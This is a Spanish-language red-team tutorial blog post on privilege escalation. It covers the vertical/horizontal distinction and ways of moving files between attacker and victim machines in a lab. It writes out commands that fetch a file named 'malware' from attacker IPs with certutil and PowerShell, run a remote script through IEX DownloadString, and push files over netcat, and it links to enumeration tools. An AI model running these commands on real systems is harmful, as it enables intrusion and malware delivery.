---
layout: post
title: Escalada de privilegios
subtitle: Introducción a Escalada de Privilegios.
tags: [redteam] 
---

# 1. Escalada de privilegios.

## 1.1. Concepto.
En ciberseguridad, **elevación de privilegios** es un intento malicioso de abusar de un error de configuración de una aplicación o sistema operativo para obtener la capacidad de acceder a regiones del sistema antes inaccesibles como información confidencial o la cuenta del administrador.

Es importante tener en cuenta que esta se trata de una etapa de post-explotación, donde el atacante ya ha conseguido adentrarse al interior de una máquina y ha obtenido un control parcial de la máquina víctima y algunas veces es innecesaria, cuando el atacante ha conseguido desde el principio privilegios de superusuario o administrador sobre la máquina.

<br />

## 1.2. Tipos de escalada de privilegios.

En definitiva, y ajustándonos a la definición anterior, por *elevación de privilegios* puede entenderse cualquier obtención de permisos que antes no se tenía sobre la máquina atacada. Es por eso que distinguimos en esencia dos tipos de elevación de privilegios:

- **Escalada de privilegios vertical**: 

	 El atacante se hace cargo de una cuenta que tiene más permisos que la cuenta de entrada original. Esto se consigue gracias al hecho de que la mayoría de los sistemas y redes están diseñados para que los usuarios con permisos regulados puedan acceder a recursos superiores.

	Esto además permite al atacante abandonar el sistema sin ser detectado, ya que puede, desde una cuenta con los suficientes permisos, borrar los registros de acceso.
	
	<br />
	
- **Escalada de privilegios horizontal**: 

	El atacante se hace cargo de una cuenta que posee le mismo nivel de acceso que el usuario que inició el ataque cibernético.

	En general, la elevación de privilegios horizontal requiere de más conocimientos que los que se requiere en la elevación de privilegios horizontal ya que no existen vectores claros que permitan obtener las credenciales de otra cuenta del sistema, se necesitan de técnicas más sofisticadas que a menudo requieren, más que de un fallo informático, de un fallo humano como el phising o spearphising.
	
<br />

# 2. Transmisión de ficheros.

Una técnica para elevar privilegios consiste en introducir en la máquina víctima un ejecutable malicioso programado precisamente para elevar privilegios aunque también existen otros mecanismos.

A continuación vamos a ver distintos comandos que podemos utilizar para transmitir ficheros entre dos máquinas en función de la dirección de la transmisión y el tipo de sistema operativo.

En esencia, se tiene que lo que se hace en todos lo casos es montar una estructura servidor-cliente en la que se traspasa un fichero de un lado a otro haciendo uso de un **puerto** y un **protocolo**. La estructura que se monta depende del comando utilizado.

<br />

## 2.1. Linux a Linux.
### 2.1.1. Subir ficheros a la máquina víctima.

- **Servidor HTTP sencillo**: Mediante este método monta un servidor web python simple que también puede estar alojado en cualquier otro servidor pero lo usaremos por su sencillez, y luego lo descargaremos con wget en la víctima (o curl si no lo está, instalado).

	En primer lugar, desde la máquina atacante con **python -m SimpleHTTPServer 80** montamos un servidor en la carpeta desde la que vamos a coger un archivo desde la máquina víctima.
	
	

	<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220124151634.png' | relative_url }}" text-align="center"/>
	</div>

	Por otro lado, desde la máquina víctima nos conectamos al servidor montado llevando a cabo una petición **wget** **con el servicio que riga en el puerto en el que se ha montado el servidor en la máquina atacante**. En este caso a ser el puerto 80 nos corresponde una petición http.

	<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220124152014.png' | relative_url }}" text-align="center"/>
	</div>

	<br />
	
	<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220124152727.png' | relative_url }}" text-align="center"/>
	</div>

	La misma operación se puede efectuar con **curl**:
	
	```bash
	curl -o ficherotransferido http://<IPAtacker>/ficheroatraspasar
	```

	<br />

- **SCP** (SSH utility):

	Este método tan sólo es válido cuando la máquina víctima tiene el servicio ssh instalado y además tenemos las credenciales.
	
	En este contexto podemos utilizar **scp** para efectuar nuestra operación. 
	
	En primer lugar, con nmap investigamos los puertos que la máquina tiene abierto:

	<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220124155140.png' | relative_url }}" text-align="center"/>
	</div>
	
	Observamos que tiene el puerto 22 abierto, indicio de que dicha máquina puede tener un servidor ssh abierto escuchando en el 22. Así, de esta manera se tiene que intentamos la conexión sabiendo además las credenciales de un usuario de la máquina:
		
	<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220124155656.png' | relative_url }}" text-align="center"/>
	</div>

	<br />
	
	<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220124155721.png' | relative_url }}" text-align="center"/>
	</div>

	Es conveniente notar que, en este caso, los papeles están invertidos; la máquina víctima ejerce el papel de servidor y nosotros somos el cliente que solicitamos una petición ssh a la máquina víctima mediante el comando **scp** que no es más que efectuar un **cp** a través de ssh.
	
	<br />
	
- **Netcat**: Netcat es una herramienta que podemos utilizar para generar comunicaciones entre máquinas. Este se puede utilizar respectivamente para bien mandar una petición o fichero o bien para escuchar y recibir una peticion desde un determinado puerto:

	<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220124161628.png' | relative_url }}" text-align="center"/>
	</div>

	En concreto, en el caso de la máquina víctima podemos pedir que escuche una petición con el modificador **-l**, en un determinado puerto con **-p** y que además verbalice las operaciones que hace con **-v** y lo que sea que escuche en dicho puerto lo rediriga al fichero que especifiquemos.
	
	<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220124162504.png' | relative_url }}" text-align="center"/>
	</div>

	Por otra parte, en la máquina atacante utilizamos netcat para pasar un fichero hacia una IP en un puerto y además añadimos el modificador **-w** para añadir un *timeout* y evitar que se bloquee dado que se trata de un fichero muy grande.
	
	<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220124164615.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220124165048.png' | relative_url }}" text-align="center"/>
	</div>

	<br />
	
- **FTP**: Vamos a montar un servidor ftp temporal utilizando el comando **twistd** y luego posteriormente bajar el archivo con **wget**. 

	<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220124172050.png' | relative_url }}" text-align="center"/>
	</div>
	
	Como podemos observar se tiene que se ha generado un servidor web que escucha en el puerto 2121. Así, desde la máquina víctima:
	
	<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220124172255.png' | relative_url }}" text-align="center"/>
	</div>

	Y se habría descargado nuestro archivo.

	<br />
	
### 2.1.2. Bajar ficheros de la máquina víctima.

Para descargar un fichero desde la máquina atacante de la máquina víctima podemos aplicar la misma estructura con los papeles invertidos. Es decir, en lugar de montar el servidor en lado del atacante y descargar el fichero desde la víctima (cliente), montamos el servidor en lado de la víctima y descargamos el fichero desde el lado del atacante (cliente).

Así, todos los ejemplos anteriores son válidos invirtiendo los papeles de las máquinas.

<br />

## 2.2. Windows a Linux.

Para el caso de windows vamos a utilizar dos máquinas, la metasploitable y la Windowsploitable donde la Windowsploitable actúa a modo de máquina víctima.

<br />

### 2.2.1. Subir ficheros a la máquina víctima.

- **Powershell DownloadFile**:

	En este caso construiremos con la máquina atacante un servidor HTTP con python en el que alojaremos el fichero deseado y seguidamente los descargaremos desde la otra máquina Windows a través de powershell:
	
	- **Linux**: Montamos el servidor http con python.

		```bash	
		python -m SimpleHTTPServer 8080
		```
		<br />

		<div style="text-align:center">
		<img src="{{ 'assets/img/M7/Pasted image 20220130103937.png' | relative_url }}" text-align="center"/>
		</div>

		<br />

	- **Windows**: Descargamos el fichero con powershell.

		<br />

		```bash			
		powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.0.2.4:8080/malware','C:\Users\user\Desktop\malware')"
		```
		<br />

		<div style="text-align:center">
		<img src="{{ 'assets/img/M7/Pasted image 20220130103819.png' | relative_url }}" text-align="center"/>
		</div>

		<br />
		y ahí tendríamos nuestro fichero.
	
	<br />
	
- **Certutil.exe**:

	Certutil.exe se trata de otra herramienta que nos permite descargar ficheros de un servidor web. Así, en primer lugar, montamos un servidor http en la máquina atacante y luego descargamos desde la máquina víctima el fichero deseado con la herramienta antes descrita:
	
	- **Linux**: Montamos el servidor con python:

		<br />

		<div style="text-align:center">
		<img src="{{ 'assets/img/M7/Pasted image 20220130104909.png' | relative_url }}" text-align="center"/>
		</div>
		
		<br />

	- **Windows**: Descargamos el fichero a través de certutil.exe:

		```bash
		certutil.exe -urlcache -split -f http://10.10.10.1:8080/malware malware
		```

		<br />

		<div style="text-align:center">
		<img src="{{ 'assets/img/M7/Pasted image 20220130104845.png' | relative_url }}" text-align="center"/>
		</div>
	
		<br />

- **Netcat**: 

	Podemos utilizar netcat para descargar un fichero desde windows, exactamente igual a como hemos hecho con Linux.
	
	- **Windows**: Desde la máquina víctima escuchamos desde cierto puerto con netcat y le decimos que transfiera lo que escuche al fichero malware:

		```bash
		nc.exe -lvp 4444 > malware
		```

		<br />

		<div style="text-align:center">
		<img src="{{ 'assets/img/M7/Pasted image 20220130111018.png' | relative_url }}" text-align="center"/>
		</div>

		<br />
		
	- **Linux**: Desde la máquina atacante enviamos el fichero malware a través de netcat en el puerto especificado.
		
		```bash
		nc 10.10.10.2 4444 -w 3 < malware
		```
		
		<br />

		<div style="text-align:center">
		<img src="{{ 'assets/img/M7/Pasted image 20220130111046.png' | relative_url }}" text-align="center"/>
		</div>
		
	
		<br />


### 2.2.2. Bajar ficheros de la máquina víctima.

- **Netcat**: Podemos invertir los papeles del caso anterior, escuchamos desde la máquina atacante y envíamos el fichero con netcat en windows.

- **Powercat** (PowerShell):

	Windows:

	<br />

	```powershell
	powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.1/malware(http://10.10.10.1/powercat.ps1)');powercat -l -p 4444 -i C:\Users\test\malware"
	```

	<br />
	
	Linux:
	
	```bash
	wget http://10.10.10.2:4444/malware
	```
	
<br />

# 3. Herramientas de recolección.
## 3.1. Ayuda en elevación de privilegios en Sistemas Linux.  

- **Linux Exploit Suggester 2**:  Sugerencia de exploits.
	 [https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)  
	 
	 <br />
	 
- **linuxprivchecker**: Enumerar la información básica del sistema y buscar vectores de escalada de privilegios comunes.
	[https://github.com/sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)  

	<br />
	
- **LinEnum**: 
	[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)  
	
	<br />
	
- **BeRoot**:
	[https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)  
	
	<br />
	
	
- **GTFOBins**: Como aprovechar comandos para conseguir info  
	[https://gtfobins.github.io/#](https://gtfobins.github.io/#)
	
	
<br />

## 3.2. Ayuda en elevación de privilegios en Sistemas Windows.

- **Windows Exploit Suggester - Next Generation**:  
	[https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)  
	
	<br />
	
- **LOLBas**: Como aprovechar comandos para conseguir info  
	[https://lolbas-project.github.io/#](https://lolbas-project.github.io/#)  
	
	<br />
	
- **BeRoot**:  
	[https://github.com/AlessandroZ/BeRoot/tree/master/Windows](https://github.com/AlessandroZ/BeRoot/tree/master/Windows)  
	
	<br />
	
- **Seatbelt**:  es un proyecto de C# que realiza una serie de "comprobaciones de seguridad" desde las perspectiva ofensiva y defensiva.

	[https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)  
	
	<br />
	
<br />

# 3. GTFOBins.

GTFOBins es una lista seleccionada de archivos binarios de Unix que se pueden usar para eludir las restricciones de seguridad locales en sistemas mal configurados.

Por ejemplo podemos observar que respecto a elevar privilegios podemos buscar respecto de nano el siguiente mecanismo:

<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220302233314.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, si en un sistema operativo tuviéramos configurado utilizar nano como root sin emplear contraseña, es decir; si pudiéramos utilizar el comando **sudo nano**  sin poner contraseña empleariamos el comando anterior con el siguiente resultado: 

<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220302235010.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/M7/Pasted image 20220302235113.png' | relative_url }}" text-align="center"/>
</div>

Llevando a cabo una elevación de privilegios y tomando control de la máquina.